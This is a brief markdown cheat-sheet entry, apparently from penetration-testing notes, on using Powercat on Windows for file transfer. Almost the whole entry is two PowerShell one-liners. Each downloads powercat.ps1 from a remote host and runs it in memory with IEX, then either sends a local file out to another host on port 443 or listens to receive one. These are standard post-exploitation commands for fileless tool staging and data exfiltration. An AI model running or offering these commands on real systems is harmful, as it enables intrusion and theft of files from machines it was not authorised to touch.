# Powercat usage (Windows only)
## File transfer
```powershell
# Send File:
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.109:8000/powercat.ps1');powercat -c 10.1.1.1 -p 443 -i C:\inputfile"
# Receive File:
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.109:8000/powercat.ps1');powercat -l -p 8000 -of C:\inputfile"
```